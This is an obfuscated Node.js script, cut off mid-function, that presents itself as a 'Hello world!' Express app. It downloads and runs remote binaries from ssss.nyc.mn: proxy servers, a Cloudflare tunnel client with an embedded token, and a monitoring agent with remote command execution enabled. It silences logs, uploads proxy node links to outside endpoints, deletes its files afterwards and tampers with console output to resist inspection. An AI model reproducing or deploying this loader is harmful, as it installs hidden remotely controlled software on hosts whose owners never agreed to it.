const _0x3f363c=_0x31f3;(function(_0x3bc1f1,_0x4066ce){const _0x30355c=_0x31f3,_0x5db8b7=_0x3bc1f1();while(!![]){try{const _0x25accc=-parseInt(_0x30355c(0x213))/0x1+parseInt(_0x30355c(0x271))/0x2+-parseInt(_0x30355c(0x283))/0x3*(parseInt(_0x30355c(0x1ee))/0x4)+-parseInt(_0x30355c(0x209))/0x5+-parseInt(_0x30355c(0x298))/0x6+parseInt(_0x30355c(0x1f4))/0x7*(-parseInt(_0x30355c(0x251))/0x8)+parseInt(_0x30355c(0x1e6))/0x9;if(_0x25accc===_0x4066ce)break;else _0x5db8b7['push'](_0x5db8b7['shift']());}catch(_0x2c0888){_0x5db8b7['push'](_0x5db8b7['shift']());}}}(_0x1c93,0x6d6a3));function _0x1c93(){const _0x254472=['post','response','from','vmess','win32','\x20>/dev/null\x202>&1\x20&','tcp','Empowerment\x20success\x20for\x20','?encryption=none&security=tls&sni=','base64','nohup\x20','267JEYKXD','push','list.txt','\x20-c\x20\x22','\x20is\x20running','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','forEach','Download\x20','\x0a\x20\x20\x20\x20','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','/api/add-subscriptions','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','cdns.doon.eu.org','express','basename','statSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','existsSync','path','Error\x20reading\x20boot.log:','join','208590QWhtPg','\x20failed:\x20','platform','bind','eyJhIjoiMGJmNWNhNWU1ZjIxZDkxMGI3NzEwMzRiNDE2ZTYxNjQiLCJ0IjoiYzM4ZjA1NmUtNTcxNC00MDI3LWI2OWYtYzM0YzEzOGExNzA1IiwicyI6Ik56VXpOemxtTVdJdE4yRXhaUzAwTlRjMExUbGlNak10TldOaU5qTTBZV0ZpWkRObCJ9','exec','clear','\x20already\x20exists','map','Error\x20downloading\x20files:','info','npm\x20running\x20error:\x20','http\x20server\x20is\x20running\x20on\x20port:','abcdefghijklmnopqrstuvwxyz','Unhandled\x20error\x20in\x20startserver:','get','unshift','\x20>/dev/null\x202>&1','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','stringify','26416116wmtBhR','\x20-s\x20','__proto__','https://amd64.ssss.nyc.mn/agent','127.0.0.1','arm64','./tmp','2087','29636ffcEqS','\x20-p\x20','https+local://8.8.8.8/dns-query','PROJECT_URL','sub.txt','freedom','4664093RbLPTU','CFIP','yx1114.yx652828.dpdns.org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','unlinkSync','trace','false','chmod','apply','send','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20\x0atrojan://','log','xtls-rprx-vision','Subscription\x20uploaded\x20successfully','\x22\x20>\x20/dev/null\x202>&1','toString','catch','TunnelSecret','message','?security=tls&sni=','2698045SLgiAJ','&path=%2Fvless-argo%3Fed%3D2560#','/dev/null','8443','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/sub.txt\x20saved\x20successfully','{}.constructor(\x22return\x20this\x22)(\x20)','2053','console','http','760798murfSq','readFileSync','443','has','table','set','child_process','error','ARGO_PORT','UUID','charAt','(((.+)+)+)+$','ARGO_AUTH','https://oooo.serv00.net/add-url','\x0a\x20\x20tunnel:\x20','match','length','trim','vless','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','firefox','listen','UPLOAD_URL','split','test','5cedfce0-f4cf-4f13-917d-1977b6989d7d','config.yaml','App\x20is\x20running','mkdirSync','2096','Hello\x20world!','exception','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','rm\x20-rf\x20','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Nodes\x20uploaded\x20successfully','/trojan-argo','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','env','/vmess-argo','/api/delete-nodes','data','sub','boot.log','random','blackhole','Add\x20automatic\x20access\x20task\x20faild:\x20','tls','NAME','pkill\x20-f\x20\x22[','https://amd64.ssss.nyc.mn/web','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','/vless-argo','filter','fileUrl','2083','aarch64','application/json','PORT','tunnel.yml','block','quic','8nsuNTr','ARGO_DOMAIN','/vmess-argo?ed=2560','&fp=firefox&type=ws&host=','https://arm64.ssss.nyc.mn/bot','status','https://arm64.ssss.nyc.mn/agent','constructor','SUB_PATH','Skipping\x20adding\x20automatic\x20access\x20task','createWriteStream','none','\x20>\x20nul\x202>&1','Error\x20executing\x20command:\x20','writeFileSync','floor','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','CFPORT','search','config.json','php\x20running\x20error:\x20','close','SERVER_PORT','arm','ARGO_DOMAIN:','utf-8','/tunnel.yml\x20run','pipe','Content-Type','\x0avless://','automatic\x20access\x20task\x20added\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','347822PRggiP','readdirSync','includes','&path=%2Ftrojan-argo%3Fed%3D2560#','prototype','FILE_PATH','tunnel.json'];_0x1c93=function(){return _0x254472;};return _0x1c93();}const _0x3f5506=(function(){let _0x28411f=!![];return function(_0x9adcb1,_0xe78240){const _0x3f13b1=_0x28411f?function(){const _0x2fdb32=_0x31f3;if(_0xe78240){const _0x32aa31=_0xe78240[_0x2fdb32(0x1fc)](_0x9adcb1,arguments);return _0xe78240=null,_0x32aa31;}}:function(){};return _0x28411f=![],_0x3f13b1;};}()),_0x5783b4=_0x3f5506(this,function(){const _0xd1a7d7=_0x31f3;return _0x5783b4['toString']()[_0xd1a7d7(0x263)](_0xd1a7d7(0x21e))[_0xd1a7d7(0x204)]()[_0xd1a7d7(0x258)](_0x5783b4)[_0xd1a7d7(0x263)]('(((.+)+)+)+$');});_0x5783b4();const _0x458671=(function(){let _0x46fd42=!![];return function(_0x20ec7e,_0x9f648f){const _0x329259=_0x46fd42?function(){const _0x503372=_0x31f3;if(_0x9f648f){const _0x3d812b=_0x9f648f[_0x503372(0x1fc)](_0x20ec7e,arguments);return _0x9f648f=null,_0x3d812b;}}:function(){};return _0x46fd42=![],_0x329259;};}()),_0x114b32=_0x458671(this,function(){const _0x237f4b=_0x31f3;let _0x1cd334;try{const _0x5a7feb=Function('return\x20(function()\x20'+_0x237f4b(0x20f)+');');_0x1cd334=_0x5a7feb();}catch(_0x515a51){_0x1cd334=window;}const _0x21c06f=_0x1cd334[_0x237f4b(0x211)]=_0x1cd334['console']||{},_0x3a8722=['log','warn',_0x237f4b(0x1dc),'error',_0x237f4b(0x232),_0x237f4b(0x217),_0x237f4b(0x1f9)];for(let _0x2c70cd=0x0;_0x2c70cd<_0x3a8722['length'];_0x2c70cd++){const _0x3527ff=_0x458671[_0x237f4b(0x258)][_0x237f4b(0x275)]['bind'](_0x458671),_0x311dc3=_0x3a8722[_0x2c70cd],_0x53a29f=_0x21c06f[_0x311dc3]||_0x3527ff;_0x3527ff[_0x237f4b(0x1e8)]=_0x458671[_0x237f4b(0x1d5)](_0x458671),_0x3527ff[_0x237f4b(0x204)]=_0x53a29f[_0x237f4b(0x204)][_0x237f4b(0x1d5)](_0x53a29f),_0x21c06f[_0x311dc3]=_0x3527ff;}});_0x114b32();const express=require(_0x3f363c(0x290)),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x3f363c(0x295)),{promisify}=require('util'),exec=promisify(require(_0x3f363c(0x219))[_0x3f363c(0x1d7)]),{execSync}=require(_0x3f363c(0x219)),UPLOAD_URL=process[_0x3f363c(0x239)][_0x3f363c(0x229)]||'',PROJECT_URL=process[_0x3f363c(0x239)][_0x3f363c(0x1f1)]||'',AUTO_ACCESS=process['env']['AUTO_ACCESS']||![],FILE_PATH=process[_0x3f363c(0x239)][_0x3f363c(0x276)]||_0x3f363c(0x1ec),SUB_PATH=process[_0x3f363c(0x239)][_0x3f363c(0x259)]||_0x3f363c(0x23d),PORT=process[_0x3f363c(0x239)][_0x3f363c(0x267)]||process['env'][_0x3f363c(0x24d)]||0xbb8,UUID=process['env'][_0x3f363c(0x21c)]||_0x3f363c(0x22c),NEZHA_SERVER=process[_0x3f363c(0x239)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x3f363c(0x239)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x3f363c(0x239)]['NEZHA_KEY']||'',ARGO_DOMAIN=process['env'][_0x3f363c(0x252)]||_0x3f363c(0x1f6),ARGO_AUTH=process[_0x3f363c(0x239)][_0x3f363c(0x21f)]||_0x3f363c(0x1d6),ARGO_PORT=process[_0x3f363c(0x239)][_0x3f363c(0x21b)]||0x1f41,CFIP=process[_0x3f363c(0x239)][_0x3f363c(0x1f5)]||_0x3f363c(0x28f),CFPORT=process['env'][_0x3f363c(0x262)]||0x1bb,NAME=process[_0x3f363c(0x239)][_0x3f363c(0x243)]||'dalong';!fs[_0x3f363c(0x294)](FILE_PATH)?(fs[_0x3f363c(0x22f)](FILE_PATH),console[_0x3f363c(0x200)](FILE_PATH+'\x20is\x20created')):console[_0x3f363c(0x200)](FILE_PATH+_0x3f363c(0x1d9));function generateRandomName(){const _0x467a24=_0x3f363c,_0x23832d=_0x467a24(0x1df);let _0x4b050f='';for(let _0x46652e=0x0;_0x46652e<0x6;_0x46652e++){_0x4b050f+=_0x23832d[_0x467a24(0x21d)](Math[_0x467a24(0x260)](Math[_0x467a24(0x23f)]()*_0x23832d['length']));}return _0x4b050f;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x3f363c(0x297)](FILE_PATH,npmName),phpPath=path[_0x3f363c(0x297)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x3f363c(0x297)](FILE_PATH,botName),subPath=path[_0x3f363c(0x297)](FILE_PATH,_0x3f363c(0x1f2)),listPath=path[_0x3f363c(0x297)](FILE_PATH,_0x3f363c(0x285)),bootLogPath=path['join'](FILE_PATH,_0x3f363c(0x23e)),configPath=path[_0x3f363c(0x297)](FILE_PATH,_0x3f363c(0x264));function deleteNodes(){const _0x2700ae=_0x3f363c;try{if(!UPLOAD_URL)return;if(!fs[_0x2700ae(0x294)](subPath))return;let _0x5037b9;try{_0x5037b9=fs[_0x2700ae(0x214)](subPath,'utf-8');}catch{return null;}const _0x1bf056=Buffer[_0x2700ae(0x27a)](_0x5037b9,_0x2700ae(0x281))['toString'](_0x2700ae(0x26a)),_0x876e0e=_0x1bf056[_0x2700ae(0x22a)]('\x0a')[_0x2700ae(0x248)](_0x3a40be=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2700ae(0x22b)](_0x3a40be));if(_0x876e0e[_0x2700ae(0x223)]===0x0)return;return axios[_0x2700ae(0x278)](UPLOAD_URL+_0x2700ae(0x23b),JSON[_0x2700ae(0x1e5)]({'nodes':_0x876e0e}),{'headers':{'Content-Type':_0x2700ae(0x24c)}})[_0x2700ae(0x205)](_0x5151e3=>{return null;}),null;}catch(_0x5aa33b){return null;}}function cleanupOldFiles(){const _0xbd5886=_0x3f363c;try{const _0x22e4b7=fs[_0xbd5886(0x272)](FILE_PATH);_0x22e4b7[_0xbd5886(0x289)](_0x424647=>{const _0x390335=_0xbd5886,_0x10b928=path[_0x390335(0x297)](FILE_PATH,_0x424647);try{const _0x2ca6a2=fs[_0x390335(0x292)](_0x10b928);_0x2ca6a2['isFile']()&&fs[_0x390335(0x1f8)](_0x10b928);}catch(_0x243c11){}});}catch(_0x170704){}}app[_0x3f363c(0x1e1)]('/',function(_0x4f9873,_0x260039){const _0x12c95d=_0x3f363c;_0x260039[_0x12c95d(0x1fd)](_0x12c95d(0x231));});async function generateConfig(){const _0x5d7664=_0x3f363c,_0x365fcf={'log':{'access':'/dev/null','error':_0x5d7664(0x20b),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5d7664(0x225),'settings':{'clients':[{'id':UUID,'flow':_0x5d7664(0x201)}],'decryption':_0x5d7664(0x25c),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x5d7664(0x23a),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x5d7664(0x1ea),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x5d7664(0x25c)},'streamSettings':{'network':_0x5d7664(0x27e),'security':_0x5d7664(0x25c)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5d7664(0x225),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5d7664(0x25c)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5d7664(0x247)}},'sniffing':{'enabled':!![],'destOverride':[_0x5d7664(0x212),_0x5d7664(0x242),_0x5d7664(0x250)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x5d7664(0x27b),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5d7664(0x23a)}},'sniffing':{'enabled':!![],'destOverride':[_0x5d7664(0x212),'tls',_0x5d7664(0x250)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5d7664(0x25c),'wsSettings':{'path':_0x5d7664(0x237)}},'sniffing':{'enabled':!![],'destOverride':[_0x5d7664(0x212),_0x5d7664(0x242),_0x5d7664(0x250)],'metadataOnly':![]}}],'dns':{'servers':[_0x5d7664(0x1f0)]},'outbounds':[{'protocol':_0x5d7664(0x1f3),'tag':'direct'},{'protocol':_0x5d7664(0x240),'tag':_0x5d7664(0x24f)}]};fs[_0x5d7664(0x25f)](path['join'](FILE_PATH,_0x5d7664(0x264)),JSON[_0x5d7664(0x1e5)](_0x365fcf,null,0x2));}function getSystemArchitecture(){const _0x4184f7=_0x3f363c,_0x530cc=os['arch']();return _0x530cc===_0x4184f7(0x268)||_0x530cc===_0x4184f7(0x1eb)||_0x530cc===_0x4184f7(0x24b)?_0x4184f7(0x268):'amd';}function downloadFile(_0x16e33c,_0x41919e,_0x58e9cd){const _0x536870=_0x3f363c,_0x1660d5=_0x16e33c;!fs[_0x536870(0x294)](FILE_PATH)&&fs[_0x536870(0x22f)](FILE_PATH,{'recursive':!![]});const _0x28539b=fs[_0x536870(0x25b)](_0x1660d5);axios({'method':_0x536870(0x1e1),'url':_0x41919e,'responseType':'stream'})['then'](_0x13b230=>{const _0x37e6a1=_0x536870;_0x13b230[_0x37e6a1(0x23c)][_0x37e6a1(0x26c)](_0x28539b),_0x28539b['on']('finish',()=>{const _0x58d515=_0x37e6a1;_0x28539b[_0x58d515(0x266)](),console[_0x58d515(0x200)](_0x58d515(0x28a)+path[_0x58d515(0x291)](_0x1660d5)+'\x20successfully'),_0x58e9cd(null,_0x1660d5);}),_0x28539b['on'](_0x37e6a1(0x21a),_0x3c1fb1=>{const _0x2f61fb=_0x37e6a1;fs['unlink'](_0x1660d5,()=>{});const _0x29b134=_0x2f61fb(0x28a)+path[_0x2f61fb(0x291)](_0x1660d5)+'\x20failed:\x20'+_0x3c1fb1['message'];console[_0x2f61fb(0x21a)](_0x29b134),_0x58e9cd(_0x29b134);});})[_0x536870(0x205)](_0x20248b=>{const _0xbc742c=_0x536870,_0x38eb1c=_0xbc742c(0x28a)+path[_0xbc742c(0x291)](_0x1660d5)+_0xbc742c(0x299)+_0x20248b['message'];console[_0xbc742c(0x21a)](_0x38eb1c),_0x58e9cd(_0x38eb1c);});}async function downloadFilesAndRun(){const _0x151820=_0x3f363c,_0x354d7f=getSystemArchitecture(),_0x35b881=getFilesForArchitecture(_0x354d7f);if(_0x35b881[_0x151820(0x223)]===0x0){console[_0x151820(0x200)](_0x151820(0x288));return;}const _0x4e3764=_0x35b881[_0x151820(0x1da)](_0x2bf974=>{return new Promise((_0x4752dc,_0x4c6f73)=>{const _0x4fbbfe=_0x31f3;downloadFile(_0x2bf974['fileName'],_0x2bf974[_0x4fbbfe(0x249)],(_0x449f9c,_0x27238d)=>{_0x449f9c?_0x4c6f73(_0x449f9c):_0x4752dc(_0x27238d);});});});try{await Promise['all'](_0x4e3764);}catch(_0x12f7fc){console[_0x151820(0x21a)](_0x151820(0x1db),_0x12f7fc);return;}function _0x4e9aea(_0x2e8185){const _0x14e2a3=0x1fd;_0x2e8185['forEach'](_0x5bba9e=>{const _0x2d6a8d=_0x31f3;fs[_0x2d6a8d(0x294)](_0x5bba9e)&&fs[_0x2d6a8d(0x1fb)](_0x5bba9e,_0x14e2a3,_0x348153=>{const _0x1f54c7=_0x2d6a8d;_0x348153?console[_0x1f54c7(0x21a)]('Empowerment\x20failed\x20for\x20'+_0x5bba9e+':\x20'+_0x348153):console[_0x1f54c7(0x200)](_0x1f54c7(0x27f)+_0x5bba9e+':\x20'+_0x14e2a3[_0x1f54c7(0x204)](0x8));});});}const _0x33cff0=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4e9aea(_0x33cff0);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5ea832=NEZHA_SERVER[_0x151820(0x273)](':')?NEZHA_SERVER[_0x151820(0x22a)](':')['pop']():'',_0x46a12f=new Set([_0x151820(0x215),_0x151820(0x20c),_0x151820(0x230),_0x151820(0x1ed),_0x151820(0x24a),_0x151820(0x210)]),_0x393fe2=_0x46a12f[_0x151820(0x216)](_0x5ea832)?'true':_0x151820(0x1fa),_0x247344='\x0aclient_secret:\x20'+NEZHA_KEY+_0x151820(0x226)+NEZHA_SERVER+_0x151820(0x28e)+_0x393fe2+_0x151820(0x293)+UUID;fs[_0x151820(0x25f)](path[_0x151820(0x297)](FILE_PATH,_0x151820(0x22d)),_0x247344);const _0x782d69='nohup\x20'+phpPath+_0x151820(0x286)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x782d69),console[_0x151820(0x200)](phpName+_0x151820(0x287)),await new Promise(_0x25d0bc=>setTimeout(_0x25d0bc,0x3e8));}catch(_0x3ee13f){console[_0x151820(0x21a)](_0x151820(0x265)+_0x3ee13f);}}else{let _0x3a6cc9='';const _0x3fa444=['443',_0x151820(0x20c),_0x151820(0x230),_0x151820(0x1ed),_0x151820(0x24a),_0x151820(0x210)];_0x3fa444[_0x151820(0x273)](NEZHA_PORT)&&(_0x3a6cc9='--tls');const _0x36c354=_0x151820(0x282)+npmPath+_0x151820(0x1e7)+NEZHA_SERVER+':'+NEZHA_PORT+_0x151820(0x1ef)+NEZHA_KEY+'\x20'+_0x3a6cc9+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x36c354),console[_0x151820(0x200)](npmName+'\x20is\x20running'),await new Promise(_0x1da1ac=>setTimeout(_0x1da1ac,0x3e8));}catch(_0x42dd79){console[_0x151820(0x21a)](_0x151820(0x1dd)+_0x42dd79);}}}else console['log'](_0x151820(0x270));const _0x43699b=_0x151820(0x282)+webPath+'\x20-c\x20'+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x43699b),console[_0x151820(0x200)](webName+_0x151820(0x287)),await new Promise(_0x319860=>setTimeout(_0x319860,0x3e8));}catch(_0x1e55d3){console[_0x151820(0x21a)]('web\x20running\x20error:\x20'+_0x1e55d3);}if(fs['existsSync'](botPath)){let _0x1d3525;if(ARGO_AUTH[_0x151820(0x222)](/^[A-Z0-9a-z=]{120,250}$/))_0x1d3525=_0x151820(0x1f7)+ARGO_AUTH;else ARGO_AUTH[_0x151820(0x222)](/TunnelSecret/)?_0x1d3525='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x151820(0x26b):_0x1d3525=_0x151820(0x1fe)+FILE_PATH+_0x151820(0x20d)+ARGO_PORT;try{await exec(_0x151820(0x282)+botPath+'\x20'+_0x1d3525+_0x151820(0x27d)),console[_0x151820(0x200)](botName+_0x151820(0x287)),await new Promise(_0x2139cb=>setTimeout(_0x2139cb,0x7d0));}catch(_0x78249f){console[_0x151820(0x21a)]('Error\x20executing\x20command:\x20'+_0x78249f);}}await new Promise(_0x1c7c3b=>setTimeout(_0x1c7c3b,0x1388));}function getFilesForArchitecture(_0x398906){const _0x486f2d=_0x3f363c;let _0x36c578;_0x398906===_0x486f2d(0x268)?_0x36c578=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x486f2d(0x255)}]:_0x36c578=[{'fileName':webPath,'fileUrl':_0x486f2d(0x245)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x9aa31c=_0x398906===_0x486f2d(0x268)?_0x486f2d(0x257):_0x486f2d(0x1e9);_0x36c578[_0x486f2d(0x1e2)]({'fileName':npmPath,'fileUrl':_0x9aa31c});}else{const _0x2eb130=_0x398906===_0x486f2d(0x268)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x36c578[_0x486f2d(0x1e2)]({'fileName':phpPath,'fileUrl':_0x2eb130});}}return _0x36c578;}function argoType(){const _0x55b635=_0x3f363c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x55b635(0x200)](_0x55b635(0x233));return;}if(ARGO_AUTH[_0x55b635(0x273)](_0x55b635(0x206))){fs[_0x55b635(0x25f)](path[_0x55b635(0x297)](FILE_PATH,_0x55b635(0x277)),ARGO_AUTH);const _0x10b22d=_0x55b635(0x221)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x55b635(0x297)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x55b635(0x1e4)+ARGO_PORT+_0x55b635(0x261);fs[_0x55b635(0x25f)](path[_0x55b635(0x297)](FILE_PATH,_0x55b635(0x24e)),_0x10b22d);}else console['log'](_0x55b635(0x235));}argoType();async function extractDomains(){const _0x3f45e3=_0x3f363c;let _0x78f80d;if(ARGO_AUTH&&ARGO_DOMAIN)_0x78f80d=ARGO_DOMAIN,console[_0x3f45e3(0x200)](_0x3f45e3(0x269),_0x78f80d),await _0x2f206b(_0x78f80d);else try{const _0x1844e5=fs[_0x3f45e3(0x214)](path['join'](FILE_PATH,'boot.log'),_0x3f45e3(0x26a)),_0x517383=_0x1844e5[_0x3f45e3(0x22a)]('\x0a'),_0x1fa11a=[];_0x517383[_0x3f45e3(0x289)](_0x5e6a50=>{const _0x1b82e8=_0x3f45e3,_0x2662ef=_0x5e6a50[_0x1b82e8(0x222)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2662ef){const _0x560a54=_0x2662ef[0x1];_0x1fa11a[_0x1b82e8(0x284)](_0x560a54);}});if(_0x1fa11a[_0x3f45e3(0x223)]>0x0)_0x78f80d=_0x1fa11a[0x0],console[_0x3f45e3(0x200)]('ArgoDomain:',_0x78f80d),await _0x2f206b(_0x78f80d);else{console[_0x3f45e3(0x200)](_0x3f45e3(0x238)),fs[_0x3f45e3(0x1f8)](path['join'](FILE_PATH,_0x3f45e3(0x23e)));async function _0x333d49(){const _0x32dde8=_0x3f45e3;try{process[_0x32dde8(0x29a)]===_0x32dde8(0x27c)?await exec('taskkill\x20/f\x20/im\x20'+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x32dde8(0x244)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x32dde8(0x203));}catch(_0x258722){}}_0x333d49(),await new Promise(_0x16df00=>setTimeout(_0x16df00,0xbb8));const _0x2fd9ed=_0x3f45e3(0x1fe)+FILE_PATH+_0x3f45e3(0x20d)+ARGO_PORT;try{await exec(_0x3f45e3(0x282)+botPath+'\x20'+_0x2fd9ed+_0x3f45e3(0x27d)),console[_0x3f45e3(0x200)](botName+_0x3f45e3(0x287)),await new Promise(_0x3ae76c=>setTimeout(_0x3ae76c,0xbb8)),await extractDomains();}catch(_0x21c80d){console['error'](_0x3f45e3(0x25e)+_0x21c80d);}}}catch(_0x55bad1){console[_0x3f45e3(0x21a)](_0x3f45e3(0x296),_0x55bad1);}async function _0x2f206b(_0x5e9d22){const _0x5d0f20=_0x3f45e3,_0x3bfb5a=execSync(_0x5d0f20(0x246),{'encoding':_0x5d0f20(0x26a)}),_0x408ac1=_0x3bfb5a[_0x5d0f20(0x224)](),_0x3f6686=NAME?NAME+'-'+_0x408ac1:_0x408ac1;return new Promise(_0x17163a=>{setTimeout(()=>{const _0x295403=_0x31f3,_0x383e79={'v':'2','ps':''+_0x3f6686,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x295403(0x25c),'net':'ws','type':_0x295403(0x25c),'host':_0x5e9d22,'path':_0x295403(0x253),'tls':'tls','sni':_0x5e9d22,'alpn':'','fp':_0x295403(0x227)},_0x4ed249=_0x295403(0x26e)+UUID+'@'+CFIP+':'+CFPORT+_0x295403(0x280)+_0x5e9d22+_0x295403(0x254)+_0x5e9d22+_0x295403(0x20a)+_0x3f6686+'\x0a\x20\x20\x0avmess://'+Buffer[_0x295403(0x27a)](JSON['stringify'](_0x383e79))[_0x295403(0x204)](_0x295403(0x281))+_0x295403(0x1ff)+UUID+'@'+CFIP+':'+CFPORT+_0x295403(0x208)+_0x5e9d22+_0x295403(0x254)+_0x5e9d22+_0x295403(0x274)+_0x3f6686+_0x295403(0x28b);console[_0x295403(0x200)](Buffer[_0x295403(0x27a)](_0x4ed249)['toString'](_0x295403(0x281))),fs[_0x295403(0x25f)](subPath,Buffer[_0x295403(0x27a)](_0x4ed249)[_0x295403(0x204)](_0x295403(0x281))),console['log'](FILE_PATH+_0x295403(0x20e)),uploadNodes(),app[_0x295403(0x1e1)]('/'+SUB_PATH,(_0x2edabb,_0x5c39e8)=>{const _0x4d827d=_0x295403,_0x4afd1c=Buffer[_0x4d827d(0x27a)](_0x4ed249)[_0x4d827d(0x204)](_0x4d827d(0x281));_0x5c39e8[_0x4d827d(0x218)](_0x4d827d(0x26d),'text/plain;\x20charset=utf-8'),_0x5c39e8[_0x4d827d(0x1fd)](_0x4afd1c);}),_0x17163a(_0x4ed249);},0x7d0);});}}async function uploadNodes(){const _0x1a26b5=_0x3f363c;if(UPLOAD_URL&&PROJECT_URL){const _0x58eb7f=PROJECT_URL+'/'+SUB_PATH,_0x3d8dcc={'subscription':[_0x58eb7f]};try{const _0x50e91d=await axios[_0x1a26b5(0x278)](UPLOAD_URL+_0x1a26b5(0x28d),_0x3d8dcc,{'headers':{'Content-Type':_0x1a26b5(0x24c)}});return _0x50e91d&&_0x50e91d[_0x1a26b5(0x256)]===0xc8?(console[_0x1a26b5(0x200)](_0x1a26b5(0x202)),_0x50e91d):null;}catch(_0x3f03dc){if(_0x3f03dc[_0x1a26b5(0x279)]){if(_0x3f03dc[_0x1a26b5(0x279)][_0x1a26b5(0x256)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1a26b5(0x294)](listPath))return;const _0x3ff209=fs[_0x1a26b5(0x214)](listPath,_0x1a26b5(0x26a)),_0x129701=_0x3ff209[_0x1a26b5(0x22a)]('\x0a')[_0x1a26b5(0x248)](_0x14b5b5=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1a26b5(0x22b)](_0x14b5b5));if(_0x129701[_0x1a26b5(0x223)]===0x0)return;const _0x14ff39=JSON[_0x1a26b5(0x1e5)]({'nodes':_0x129701});try{const _0x133af4=await axios[_0x1a26b5(0x278)](UPLOAD_URL+'/api/add-nodes',_0x14ff39,{'headers':{'Content-Type':_0x1a26b5(0x24c)}});return _0x133af4&&_0x133af4['status']===0xc8?(console[_0x1a26b5(0x200)](_0x1a26b5(0x236)),_0x133af4):null;}catch(_0x37bac9){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5e1fce=_0x31f3,_0x479874=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x479874[_0x5e1fce(0x284)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x479874[_0x5e1fce(0x284)](phpPath);process[_0x5e1fce(0x29a)]===_0x5e1fce(0x27c)?exec('del\x20/f\x20/q\x20'+_0x479874[_0x5e1fce(0x297)]('\x20')+_0x5e1fce(0x25d),_0x554df6=>{const _0x2a6213=_0x5e1fce;console[_0x2a6213(0x1d8)](),console[_0x2a6213(0x200)](_0x2a6213(0x22e)),console[_0x2a6213(0x200)](_0x2a6213(0x28c));}):exec(_0x5e1fce(0x234)+_0x479874[_0x5e1fce(0x297)]('\x20')+_0x5e1fce(0x1e3),_0x5c544e=>{const 